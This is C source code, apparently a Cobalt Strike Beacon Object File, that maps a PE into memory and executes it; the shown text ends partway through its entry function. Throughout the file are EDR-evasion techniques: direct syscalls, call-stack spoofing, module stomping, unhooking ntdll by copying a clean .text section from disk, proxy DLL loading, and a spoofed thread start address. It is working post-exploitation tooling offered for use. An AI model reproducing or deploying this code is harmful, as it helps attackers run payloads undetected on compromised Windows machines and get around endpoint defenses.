                BeaconPrintf(CALLBACK_ERROR, "[!] Can't get address of Ntdll.dll");
#endif
                break;
            }

            PVOID pRtlAllocateHeap = GetProcAddress(hNtdll, "RtlAllocateHeap");
            PVOID pRtlCreateHeap = GetProcAddress(hNtdll, "RtlCreateHeap");

            if (!pRtlAllocateHeap || !pRtlCreateHeap)
            {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] Can't resolve RtlAllocateHeap");
#endif
                break;
            }

            g_Heap = DRAUGR_API(pRtlCreateHeap, HEAP_NO_SERIALIZE, NULL, 0x30000, 0x10000, NULL);
            if (!g_Heap)
            {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] RtlCreateHeap failed");
#endif
                break;
            }
            pMemoryAddress = DRAUGR_API(pRtlAllocateHeap, g_Heap, HEAP_ZERO_MEMORY, dwSize);

            if (!pMemoryAddress)
            {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] RtlAllocateHeap failed");
#endif
                break;
            }
            RegionSize = dwSize;

            if (Config->AllocRWX)
            {
                PVOID   pTempPtr = pMemoryAddress;
                Status = DRAUGR_SYSCALL(NtProtectVirtualMemory, NtCurrentProcess, &pTempPtr, &RegionSize, PAGE_EXECUTE_READWRITE, &uOldProtect);
                if (NT_ERROR(Status))
                {
#ifdef _DEBUG
                    BeaconPrintf(CALLBACK_ERROR, "[!] Can't change memory protection: 0x%llx", Status);
#endif
                    break;
                }
            }

            break;
        }

        case ALLOC_VIRTUALALLOC:
        {
            RegionSize = dwSize;
            Status = DRAUGR_SYSCALL(NtAllocateVirtualMemory, NtCurrentProcess, &pMemoryAddress, NULL, &RegionSize, MEM_COMMIT | MEM_RESERVE, dwMemProtect);
            
            if (NT_ERROR(Status)) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] NtAllocateVirtualMemory failed: 0x%llx", Status);
#endif
                break;
            }
            break;
        }
        
        case ALLOC_STOMPING:
        {
            HMODULE pKernel32 = GetModuleHandleA("Kernel32.dll");
            
            if (!pKernel32) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] Can't get Kernel32.dll handle");
#endif
                break;
            }
            
            PVOID pLoadLibraryExA = GetProcAddress(pKernel32, "LoadLibraryExA");
            if (!pLoadLibraryExA) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] Can't resolve LoadLibraryExA");
#endif
                break;
            }
            
            HMODULE StompModule = DRAUGR_API(pLoadLibraryExA, Config->StompModule, NULL, DONT_RESOLVE_DLL_REFERENCES);
            
            if (!StompModule) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] Failed to load stomping module: %s", Config->StompModule);
#endif
                break;
            }
            
            DWORD dwStompTextSectionVa = 0;
            DWORD dwStompTextSectionSize = 0;
            
            if (!DraugrGetSection(StompModule, ".text", &dwStompTextSectionVa, &dwStompTextSectionSize)) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] Can't get .text section information");
#endif
                break;
            }
            
            if (dwStompTextSectionSize < dwSize) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] .text section too small (%d < %d)", dwStompTextSectionSize, dwSize);
#endif
                break;
            }
            
            pMemoryAddress = (PVOID)((DWORD64)StompModule + dwStompTextSectionVa);
            
            SIZE_T  stRemoveSize = dwSize;
            Status = DRAUGR_SYSCALL(NtAllocateVirtualMemory, NtCurrentProcess, &Config->RestoreStomping.OriginalContent, 0, &stRemoveSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
            if(NT_ERROR(Status)){
                BeaconPrintf(CALLBACK_ERROR, "Can't allocate memory to restore original dll content !");
                break;
            }

            Config->RestoreStomping.ModuleAddress = pMemoryAddress;
            Config->RestoreStomping.ContentSize = dwSize; 


            _memset(Config->RestoreStomping.OriginalContent, 0, dwSize);


            _memcpy(Config->RestoreStomping.OriginalContent, pMemoryAddress, dwSize);

            uOldProtect = 0;
            RegionSize = dwSize;
            PVOID   pTempPtr = pMemoryAddress;

            Status = DRAUGR_SYSCALL(NtProtectVirtualMemory, NtCurrentProcess,  &pTempPtr, &RegionSize, dwMemProtect, &uOldProtect);
            if (NT_ERROR(Status)) {
                BeaconPrintf(CALLBACK_ERROR, "[!] Can't change memory protection: 0x%llx", Status);
                pMemoryAddress = NULL;
                break;
            }
            
            _memset(pMemoryAddress, 0, dwSize);
            break;
        }
        
        default:
            BeaconPrintf(CALLBACK_ERROR, "[!] Unknown allocation method: %d", Config->Allocation);
            break;
    }
    
    return pMemoryAddress;
}


/**
 * @brief Copies PE sections from file alignment to memory alignment
 * 
 * This function maps all PE sections from the raw file buffer into the
 * properly aligned memory locations based on the section headers.
 * 
 * @param InMemoryPe Base address of the allocated memory for the PE
 * @param NtHeader Pointer to the PE's NT headers structure
 * @param PeContent Pointer to the raw PE file content
 */
void CopyPeSection(
    _In_    PVOID               InMemoryPe,
    _In_    PIMAGE_NT_HEADERS   NtHeaders,
    _In_    PVOID               PeContent
)
{
    PIMAGE_SECTION_HEADER SecHeader = IMAGE_FIRST_SECTION(NtHeaders);

    for (int i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++)
    {
        PVOID   DestinationAddress = C_DW64(InMemoryPe) + SecHeader[i].VirtualAddress;
        PVOID   SourceAddress = C_DW64(PeContent) + SecHeader[i].PointerToRawData;
        DWORD   SectionSize = SecHeader[i].SizeOfRawData;
        
       _memcpy(DestinationAddress, SourceAddress, SectionSize);
    }
}


/**
 * @brief Resolves and patches the Import Address Table (IAT) of a PE
 * 
 * This function walks through all imported modules and functions, loading
 * required DLLs and resolving function addresses. It supports custom hooks
 * via HookGetProcedureAddress and uses proxy loading methods for evasion.
 * 
 * @param InMemoryPe Base address of the PE in memory
 * @param NtHeader Pointer to the PE's NT headers structure
 * @param Config Configuration structure containing proxy loading method
 * 
 * @return TRUE if IAT was successfully patched, FALSE on failure
 * 
 * @note This function may hook certain API calls if HookGetProcedureAddress
 *       returns a non-NULL address
 */
BOOL PatchIatTable(
    _In_    PVOID               InMemoryPe,
    _In_    PIMAGE_NT_HEADERS   NtHeader,
    _In_    PCONFIG             Config
)
{
    HMODULE pKernel32 = GetModuleHandleA("Kernel32.dll");
    if (!pKernel32) {
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_ERROR, "[!] Can't get Kernel32.dll handle");
#endif
        return FALSE;
    }

    PVOID pGetModuleHandleA = GetProcAddress(pKernel32, "GetModuleHandleA");
    PVOID pGetProcAddress = GetProcAddress(pKernel32, "GetProcAddress");
    
    if (!pGetModuleHandleA || !pGetProcAddress) {
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_ERROR, "[!] Can't resolve required functions");
#endif
        return FALSE;
    }

    PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(C_DW64(InMemoryPe) + NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (pImageImportDescriptor->Name != 0)
    {
        LPSTR lpModuleName = (LPSTR)(C_DW64(InMemoryPe) + pImageImportDescriptor->Name);
        
        HMODULE pModuleAddress = DRAUGR_API(pGetModuleHandleA, lpModuleName);
        
        if (!pModuleAddress)
        {
            if (!ProxyLoadLibraryA(lpModuleName, Config->Proxy, &pModuleAddress)) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] Can't load module %s: Error %d", lpModuleName, GetLastError());
#endif
                return FALSE;
            }
        }

#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Module: %s at 0x%p", lpModuleName, pModuleAddress);
#endif
        PIMAGE_THUNK_DATA pOgImgThunkData = (PIMAGE_THUNK_DATA)(C_DW64(InMemoryPe) + pImageImportDescriptor->OriginalFirstThunk);
        PIMAGE_THUNK_DATA pFirstImgThunkData = (PIMAGE_THUNK_DATA)(C_DW64(InMemoryPe) + pImageImportDescriptor->FirstThunk);

        while (pOgImgThunkData->u1.AddressOfData != 0)
        {
            PVOID pProcedureAddress = NULL;

            if (IMAGE_SNAP_BY_ORDINAL(pOgImgThunkData->u1.Ordinal))
            {
                pProcedureAddress = DRAUGR_API(pGetProcAddress, pModuleAddress, MAKEINTRESOURCEA(IMAGE_ORDINAL(pOgImgThunkData->u1.Ordinal)));
                
                if (!pProcedureAddress) {
#ifdef _DEBUG
                    BeaconPrintf(CALLBACK_ERROR, "[!] Can't resolve ordinal %lld", IMAGE_ORDINAL(pOgImgThunkData->u1.Ordinal));
#endif
                    return FALSE;
                }
                pFirstImgThunkData->u1.Function = C_DW64(pProcedureAddress);
            }
            else
            {
                PIMAGE_IMPORT_BY_NAME ImgImportByName = (PIMAGE_IMPORT_BY_NAME)(C_DW64(InMemoryPe) + pOgImgThunkData->u1.AddressOfData);
                pProcedureAddress = HookGetProcedureAddress(ImgImportByName->Name);
                
                if (!pProcedureAddress) {
                    pProcedureAddress = DRAUGR_API(pGetProcAddress, pModuleAddress, ImgImportByName->Name);
#ifdef _DEBUG
					BeaconPrintf(CALLBACK_OUTPUT, "Function %s at 0x%p", ImgImportByName->Name, pProcedureAddress);
#endif
					if (!pProcedureAddress) {
#ifdef _DEBUG
                        BeaconPrintf(CALLBACK_ERROR, "[!] Can't resolve function %s", ImgImportByName->Name);
#endif
                        return FALSE;
                    }
                }
                
                pFirstImgThunkData->u1.Function = C_DW64(pProcedureAddress);
            }
            
            pFirstImgThunkData++;
            pOgImgThunkData++;
        }

        pImageImportDescriptor++;
    }

    return TRUE;
}


/**
 * @brief Applies base relocations to a PE loaded at a different address
 * 
 * This function processes the relocation table and patches all addresses
 * that need adjustment when the PE is loaded at an address different from
 * its preferred ImageBase.
 * 
 * @param InMemoryPe Base address where the PE is loaded in memory
 * @param NtHeader Pointer to the PE's NT headers structure
 * 
 * @note If the PE is loaded at its preferred ImageBase or has no relocations,
 *       this function returns early without modifications
 */
VOID PatchRelocTable(
    _In_    PVOID               InMemoryPe,
    _In_    PIMAGE_NT_HEADERS   NtHeader
)
{
    if (NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0)
    {
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "[*] No relocation table");
#endif
        return;
    }

    PIMAGE_BASE_RELOCATION CurrentBaseReloc = (PIMAGE_BASE_RELOCATION)(
        (DWORD64)InMemoryPe + 
        NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
    );

    LONGLONG DeltaReloc = (DWORD64)InMemoryPe - NtHeader->OptionalHeader.ImageBase;
    
#ifdef _DEBUG
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Relocation delta: 0x%llX", DeltaReloc);
#endif

    if (DeltaReloc == 0) {
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "[*] PE loaded at preferred base, no relocation needed");
#endif
        return;
    }

    while (CurrentBaseReloc->SizeOfBlock > 0)
    {
        DWORD64 BaseReloc = (DWORD64)InMemoryPe + CurrentBaseReloc->VirtualAddress;
        PWORD pRelocData = (PWORD)((DWORD64)CurrentBaseReloc + sizeof(IMAGE_BASE_RELOCATION));
        
        DWORD NbrOfRelocs = (CurrentBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

        for (DWORD i = 0; i < NbrOfRelocs; i++)
        {
            WORD relocEntry = pRelocData[i];
            WORD type = (relocEntry >> 12) & 0x0F;
            WORD offset = relocEntry & 0x0FFF;

            PVOID pPatchAddr = (PVOID)(BaseReloc + offset);

            switch (type)
            {
                case IMAGE_REL_BASED_ABSOLUTE:
                    break;

                case IMAGE_REL_BASED_DIR64:
                    *(DWORD64*)pPatchAddr += DeltaReloc;
                    break;

                case IMAGE_REL_BASED_HIGHLOW:
                    *(DWORD32*)pPatchAddr += (DWORD32)DeltaReloc;
                    break;

                case IMAGE_REL_BASED_HIGH:
                    *(WORD*)pPatchAddr += HIWORD(DeltaReloc);
                    break;

                case IMAGE_REL_BASED_LOW:
                    *(WORD*)pPatchAddr += LOWORD(DeltaReloc);
                    break;

                default:
#ifdef _DEBUG
                    BeaconPrintf(CALLBACK_ERROR, "[!] Unknown relocation type: %d", type);
#endif
                    break;
            }
        }

        CurrentBaseReloc = (PIMAGE_BASE_RELOCATION)((DWORD64)CurrentBaseReloc + CurrentBaseReloc->SizeOfBlock);
    }
#ifdef _DEBUG
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Relocations applied successfully");
#endif 
    return;
}

/**
 * @brief Restores proper memory protection flags for each PE section
 * 
 * This function sets appropriate memory protection (RWX, RX, RW, etc.) for
 * each section based on the section characteristics defined in the PE headers.
 * This is crucial for proper PE execution and memory security.
 * 
 * @param InMemoryPe Base address of the PE in memory
 * @param NtHeader Pointer to the PE's NT headers structure
 * 
 * @return TRUE if all section protections were successfully applied, FALSE on failure
 * 
 * @note The function uses NtProtectVirtualMemory syscall for stealth
 */
BOOL RestoreMemoryProtect(
    _In_    PVOID               InMemoryPe,
    _In_    PIMAGE_NT_HEADERS   NtHeader
)
{
    PIMAGE_SECTION_HEADER SecHeader = IMAGE_FIRST_SECTION(NtHeader);
    NTSTATUS Status = 0;

    for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
    {
        PVOID   SectionAddress = C_DW64(InMemoryPe) + SecHeader[i].VirtualAddress;
        SIZE_T  SectionSize = SecHeader[i].SizeOfRawData;
        DWORD   dwMemoryProtection = PAGE_NOACCESS;

        if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
        {
            if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ) && (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
                dwMemoryProtection = PAGE_EXECUTE_READWRITE;
            else if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
                dwMemoryProtection = PAGE_EXECUTE_READ;
            else if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
                dwMemoryProtection = PAGE_EXECUTE_WRITECOPY;
            else
                dwMemoryProtection = PAGE_EXECUTE;
        }
        else if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
        {
            if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
             dwMemoryProtection = PAGE_READWRITE;
            else
                dwMemoryProtection = PAGE_READONLY;
        }
        else if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
        {
            dwMemoryProtection = PAGE_WRITECOPY;
        }



        ULONG uOldProtect = 0;
        
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Section: %.8s Addr: 0x%p Size: 0x%X Protect: 0x%X", SecHeader[i].Name, SectionAddress, SectionSize, dwMemoryProtection);
#endif
        Status = DRAUGR_SYSCALL(NtProtectVirtualMemory, NtCurrentProcess, &SectionAddress, &SectionSize, dwMemoryProtection, &uOldProtect);
        
        if (NT_ERROR(Status)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to restore memory protection: 0x%llX", Status);
            return FALSE;
        }
    }

    return TRUE;
}

/**
 * @brief Unhooks a DLL by replacing its .text section with fresh copy from disk
 *
 * This function:
 * 1. Backs up the current .text section
 * 2. Reads the DLL from disk
 * 3. Replaces the hooked .text section with the clean one from disk
 *
 * @param[inout] pUnhookModule  Structure to store unhook information
 *
 * @return TRUE if successful, FALSE otherwise
 */
BOOL UnhookModule(
    _Inout_ PUNHOOK_MODULE pUnhookModule
)
{
    NTSTATUS          Status = STATUS_SUCCESS;
    HMODULE           hModule = NULL;
    HANDLE            hFile = NULL;
    PVOID             pFreshModule = NULL;
    DWORD             dwTextRva = 0;
    DWORD             dwTextSize = 0;
    DWORD             dwFileSize = 0;
    BOOL              bSuccess = TRUE;
    SIZE_T            regionSize = 0;
    UNICODE_STRING    ntPath = { 0 };
    OBJECT_ATTRIBUTES objAttr = { 0 };
    IO_STATUS_BLOCK   ioStatusBlock = { 0 };
    PVOID             pProtectionRegion = NULL;
    ULONG             ulOldProtect = 0;

    if (!pUnhookModule) {
        return FALSE;
    }

    hModule = GetModuleHandleA("Ntdll.dll");
    if (!hModule) {
        return FALSE;
    }

    if (!DraugrGetSection(hModule, ".text",  &dwTextRva, &dwTextSize)) {
        return FALSE;
    }

    pUnhookModule->pTextSectionAddress = C_DW64(hModule) + dwTextRva;
    pUnhookModule->dwTextSectionSize = dwTextSize;

    do
    {
        regionSize = dwTextSize;
        Status = DRAUGR_SYSCALL(NtAllocateVirtualMemory,
                                NtCurrentProcess,
                                &pUnhookModule->pOriginalContent,
                                0,
                                &regionSize,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_READWRITE);

        if (NT_ERROR(Status))
        {
            bSuccess = FALSE;
            break;
        }

        _memcpy(
            pUnhookModule->pOriginalContent,
            pUnhookModule->pTextSectionAddress,
            pUnhookModule->dwTextSectionSize);

        RtlInitUnicodeString(&ntPath, L"\\??\\C:\\Windows\\System32\\ntdll.dll");
        InitializeObjectAttributes(
            &objAttr,
            &ntPath,
            OBJ_CASE_INSENSITIVE,
            NULL,
            NULL);

        Status = DRAUGR_SYSCALL(NtCreateFile,
                                &hFile,
                                GENERIC_READ | SYNCHRONIZE,
                                &objAttr,
                                &ioStatusBlock,
                                NULL,
                                FILE_ATTRIBUTE_NORMAL,
                                FILE_SHARE_READ,
                                FILE_OPEN,
                                FILE_SYNCHRONOUS_IO_NONALERT,
                                NULL,
                                0);
        if (NT_ERROR(Status))
        {
            bSuccess = FALSE;
            break;
        }

        PVOID pGetFileSize = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "GetFileSize");
        if (!pGetFileSize)
        {
            bSuccess = FALSE;
            break;
        }

        dwFileSize = DRAUGR_API(pGetFileSize, hFile, NULL);
        if (dwFileSize == INVALID_FILE_SIZE)
        {
            bSuccess = FALSE;
            break;
        }

        regionSize = dwFileSize;
        Status = DRAUGR_SYSCALL(NtAllocateVirtualMemory,
                                NtCurrentProcess,
                                &pFreshModule,
                                0,
                                &regionSize,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_READWRITE);

        if (NT_ERROR(Status))
        {
            bSuccess = FALSE;
            break;
        }

        _memset(&ioStatusBlock, 0, sizeof(IO_STATUS_BLOCK));
        Status = DRAUGR_SYSCALL(NtReadFile,
                                hFile,
                                NULL,
                                NULL,
                                NULL,
                                &ioStatusBlock,
                                pFreshModule,
                                dwFileSize,
                                NULL,
                                NULL);
        if (NT_ERROR(Status))
        {
            bSuccess = FALSE;
            break;
        }

        pProtectionRegion = pUnhookModule->pTextSectionAddress;
        regionSize = dwTextSize;
        Status = DRAUGR_SYSCALL(NtProtectVirtualMemory,
                                NtCurrentProcess,
                                &pProtectionRegion,
                                &regionSize,
                                PAGE_EXECUTE_READWRITE,
                                &ulOldProtect);

        if (NT_ERROR(Status))
        {
            bSuccess = FALSE;
            break;
        }
        _memcpy(
            pUnhookModule->pTextSectionAddress,
            C_DW64(pFreshModule) + dwTextRva,
            dwTextSize);

        pProtectionRegion = pUnhookModule->pTextSectionAddress;
        regionSize = dwTextSize;

        Status = DRAUGR_SYSCALL(NtProtectVirtualMemory,
                                NtCurrentProcess,
                                &pProtectionRegion,
                                &regionSize,
                                ulOldProtect,
                                &ulOldProtect);

        if (NT_ERROR(Status))
        {
            bSuccess = FALSE;
            break;
        }
    } while (FALSE);
#ifdef _DEBUG
    BeaconPrintf(CALLBACK_OUTPUT, "Unhook status : %s", bSuccess ? "SUCCESS" : "FAIL");
#endif

    if(!bSuccess) {
        regionSize = 0;
        DRAUGR_SYSCALL(NtFreeVirtualMemory, NtCurrentProcess, &pUnhookModule->pOriginalContent, &regionSize, MEM_RELEASE);
    }

    if (pFreshModule) {
        regionSize = 0;
        DRAUGR_SYSCALL(NtFreeVirtualMemory, NtCurrentProcess, &pFreshModule, &regionSize, MEM_RELEASE);
    }

    if (hFile) {
       DRAUGR_SYSCALL(NtClose, hFile);
    }
 
    return bSuccess;
}



/**
 * @brief Restores a module to its previously hooked state
 *
 * @param[in] pUnhookModule Structure containing the original hooked content
 *
 * @return TRUE if successful, FALSE otherwise
 */
BOOL RestoreModuleHooks(
    _In_ PUNHOOK_MODULE pUnhookModule
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PVOID    pProtectAddress = NULL;
    SIZE_T   protectSize = 0;
    ULONG    ulOldProtect = 0;

    if (!pUnhookModule || !pUnhookModule->pOriginalContent ||
        !pUnhookModule->pTextSectionAddress) {
        return FALSE;
    }

    pProtectAddress = pUnhookModule->pTextSectionAddress;
    protectSize = pUnhookModule->dwTextSectionSize;

    Status = DRAUGR_SYSCALL(NtProtectVirtualMemory,
        NtCurrentProcess,
        &pProtectAddress,
        &protectSize,
        PAGE_EXECUTE_READWRITE,
        &ulOldProtect
    );
    if (NT_ERROR(Status)) {
        return FALSE;
    }

    _memcpy(
        pUnhookModule->pTextSectionAddress,
        pUnhookModule->pOriginalContent,
        pUnhookModule->dwTextSectionSize
    );

    pProtectAddress = pUnhookModule->pTextSectionAddress;
    protectSize = pUnhookModule->dwTextSectionSize;
    Status = DRAUGR_SYSCALL(NtProtectVirtualMemory,
        NtCurrentProcess,
        &pProtectAddress,
        &protectSize,
        ulOldProtect,
        &ulOldProtect
    );
    if (NT_ERROR(Status)) {
        return FALSE;
    }

    SIZE_T regionSize = 0;
	DRAUGR_SYSCALL(NtFreeVirtualMemory, NtCurrentProcess, &pUnhookModule->pOriginalContent, &regionSize, MEM_RELEASE);

    return TRUE;
}


/**
 * @brief BOF entry point - executes a PE in memory
 * @param Args Packed arguments from beacon
 * @param Len Length of arguments buffer
 * 
 * This function:
 * 1. Parses configuration from beacon
 * 2. Optionally unhooks ntdll.dll
 * 3. Allocates memory using specified method
 * 4. Maps PE sections and patches IAT/relocations
 * 5. Executes PE in a new thread with spoofed start address
 * 6. Cleans up all resources after execution
 */
void go(
    _In_    char*   Args,
    _In_    int     Len
)
{
    CONFIG      Config = { 0 };
    datap       parser;
    char*       peArgs = NULL;
    int         peArgsLen = 0;
    char*       peData = NULL;
    int         peDataSize = 0;
    int         strLen = 0;

    BeaconDataParse(&parser, Args, Len);

    Config.Proxy = (PROXY_METHOD)BeaconDataInt(&parser);
    Config.Allocation = (ALLOCATION_METHOD)BeaconDataInt(&parser);
    
    char* stompModule = BeaconDataExtract(&parser, &strLen);
    if (stompModule && strLen > 0) {
        int copyLen = (strLen < 31) ? strLen : 31;
        for (int i = 0; i < copyLen; i++) {
            Config.StompModule[i] = stompModule[i];
        }
        Config.StompModule[copyLen] = '\0';
    }

    Config.AllocRWX = (BOOL)BeaconDataInt(&parser);
    Config.UnhookNtdll = (BOOL)BeaconDataInt(&parser);
    Config.Timeout = (DWORD)BeaconDataInt(&parser);

    char* threadModule = BeaconDataExtract(&parser, &strLen);
    if (threadModule && strLen > 0) {
        int copyLen = (strLen < 63) ? strLen : 63;
        for (int i = 0; i < copyLen; i++) {
            Config.SpoofThread.ModuleName[i] = threadModule[i];
        }
        Config.SpoofThread.ModuleName[copyLen] = '\0';
    }

    char* threadFunction = BeaconDataExtract(&parser, &strLen);
    if (threadFunction && strLen > 0) {
        int copyLen = (strLen < 63) ? strLen : 63;
        for (int i = 0; i < copyLen; i++) {
            Config.SpoofThread.ProcedureName[i] = threadFunction[i];
        }
        Config.SpoofThread.ProcedureName[copyLen] = '\0';
    }

    Config.SpoofThread.Offset = (DWORD)BeaconDataInt(&parser);

    peArgs = BeaconDataExtract(&parser, &peArgsLen);
    peData = BeaconDataExtract(&parser, &peDataSize);

    PVOID pStartModule = GetModuleHandleA(Config.SpoofThread.ModuleName);
    if (!pStartModule) {
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get module: %s", Config.SpoofThread.ModuleName);
#endif
        return;
    }

    PVOID pStartFunction = GetProcAddress(pStartModule, Config.SpoofThread.ProcedureName);
    if (!pStartFunction) {
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get function: %s", Config.SpoofThread.ProcedureName);
#endif
        return;
    }

    pStartFunction = (PVOID)(C_DW64(pStartFunction) + Config.SpoofThread.Offset);

#ifdef _DEBUG
    formatp     format;
    BeaconFormatAlloc(&format, 8192);
    
    BeaconFormatPrintf(&format, "\n[+] RunPe Configuration Received\n");
    BeaconFormatPrintf(&format, "============================================================\n");

    BeaconFormatPrintf(&format, "\n[*] Proxy Configuration:\n");
    BeaconFormatPrintf(&format, "    Proxy Method:        %s (%d)\n", 
        ProxyMethodToString(Config.Proxy), Config.Proxy);

    BeaconFormatPrintf(&format, "\n[*] Memory Configuration:\n");
    BeaconFormatPrintf(&format, "    Allocation Method:   %s (%d)\n",  AllocationMethodToString(Config.Allocation), Config.Allocation);
    
    if (Config.StompModule[0]) {
        BeaconFormatPrintf(&format, "    Stomp Module:        %s\n", Config.StompModule);
    } else {
        BeaconFormatPrintf(&format, "    Stomp Module:        (none)\n");
    }
    
    BeaconFormatPrintf(&format, "    Allocate RWX:        %s\n",  Config.AllocRWX ? "Yes" : "No");
    BeaconFormatPrintf(&format, "    Unhook Ntdll:        %s\n",  Config.UnhookNtdll ? "Yes" : "No");

    BeaconFormatPrintf(&format, "\n[*] Thread Configuration:\n");
    
    if (Config.SpoofThread.ModuleName[0]) {
        BeaconFormatPrintf(&format, "    Module Name:         %s\n", Config.SpoofThread.ModuleName);
    } else {
        BeaconFormatPrintf(&format, "    Module Name:         (none)\n");
    }
    
    if (Config.SpoofThread.ProcedureName[0]) {
        BeaconFormatPrintf(&format, "    Function Name:       %s\n", Config.SpoofThread.ProcedureName);
    } else {
        BeaconFormatPrintf(&format, "    Function Name:       (none)\n");
    }
    
    BeaconFormatPrintf(&format, "    Offset:              0x%X\n",  Config.SpoofThread.Offset);
    BeaconFormatPrintf(&format, "    Timeout:             %d ms\n", Config.Timeout);

    BeaconFormatPrintf(&format, "\n[*] PE Information:\n");
    
    if (peArgs && peArgsLen > 0) {
        BeaconFormatPrintf(&format, "    Arguments:           %s\n", peArgs);
        BeaconFormatPrintf(&format, "    Arguments Length:    %d bytes\n", peArgsLen);
    } else {
        BeaconFormatPrintf(&format, "    Arguments:           (none)\n");
        BeaconFormatPrintf(&format, "    Arguments Length:    0 bytes\n");
    }
    
    BeaconFormatPrintf(&format, "    PE Size:             %d bytes\n", peDataSize);
	BeaconFormatPrintf(&format, "\n[*] Opsec :\n");
#endif

	if (!InitVxTable(&VxTable)) {
#ifdef _DEBUG
		BeaconFormatPrintf(&format, "    VX Table initialisation :       Failed\n");
#endif
		return;
	}

#ifdef _DEBUG
	BeaconFormatPrintf(&format, "    VX Table:                [OK] Syscalls resolved\n");
#endif

    if (!DraugrInit(&SyntheticStackframe)) {
#ifdef _DEBUG
        BeaconFormatPrintf(&format, "    Draugr initialisation :         Failed\n");
#endif
        return;
    }

#ifdef _DEBUG

    BeaconFormatPrintf(&format, "    Draugr:                  [OK] Stack spoofing ready\n");
    
    
    BeaconFormatPrintf(&format, "\n============================================================\n");
    BeaconFormatPrintf(&format, "[+] Configuration parsing completed successfully\n");
    int size = 0;
    char* output = BeaconFormatToString(&format, &size);
    BeaconOutput(CALLBACK_OUTPUT, output, size);
    BeaconFormatFree(&format);
#endif

	if (!InitArgs(peArgs, "NtDallas.exe")) {
#ifdef _DEBUG
		BeaconPrintf(CALLBACK_ERROR, "Can't init PE Args !");
#endif
		return;
	}

	/* ------------------------
		FUNCTION VARS
	------------------------ */

    UNHOOK_MODULE       UnhookNtdll         = { 0 };
    PIMAGE_DOS_HEADER   DosHeaders          = NULL;
	PIMAGE_NT_HEADERS   Ntheaders           = NULL;
    PVOID	            MemoryPeAddress     = NULL;
	PVOID 	            pPeStartAddress     = NULL;
	HANDLE              hThread             = NULL;
	CONTEXT             Ctx                 = { 0 };
    LARGE_INTEGER       lTimeout            = { 0 };
	NTSTATUS	        Status              = 0;

    /* ------------------------
       RUN PE
    ------------------------ */
    do
    {

        if (Config.UnhookNtdll)
        {
            if (!UnhookModule(&UnhookNtdll))
            {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "Ntdll unhook fail !");
#endif
                break;
            }
        }

        /* ------------------------
            MAP PE IN MEMORY
        ------------------------ */

        DosHeaders = (PIMAGE_DOS_HEADER)peData;
        Ntheaders = C_DW64(peData) + DosHeaders->e_lfanew;

        if (Ntheaders->Signature != IMAGE_NT_SIGNATURE)
        {
            BeaconPrintf(CALLBACK_ERROR, "[!] NtHeaders mismatch !");
            break;
        }

#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Size of image : %d", Ntheaders->OptionalHeader.SizeOfImage);
#endif
        MemoryPeAddress = AllocateMemory(Ntheaders->OptionalHeader.SizeOfImage, &Config);
        if(!MemoryPeAddress) {
            break;
        }
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Allocated memory addr : %p", MemoryPeAddress);
#endif

        CopyPeSection(MemoryPeAddress, Ntheaders, peData);

        if (!PatchIatTable(MemoryPeAddress, Ntheaders, &Config))
        {
            BeaconPrintf(CALLBACK_ERROR, "[!] Can't patch IAT !");
            break;
        }

        PatchRelocTable(MemoryPeAddress, Ntheaders);

        if (!Config.AllocRWX)
        {
            if (!RestoreMemoryProtect(MemoryPeAddress, Ntheaders))
            {
                BeaconPrintf(CALLBACK_ERROR, "Can't set correct memory protection !");
                break;
            }
#ifdef _DEBUG
            BeaconPrintf(CALLBACK_OUTPUT, "Memory protection set with success !");
#endif
        }

        pPeStartAddress = C_DW64(MemoryPeAddress) + Ntheaders->OptionalHeader.AddressOfEntryPoint;
#ifdef _DEBUG
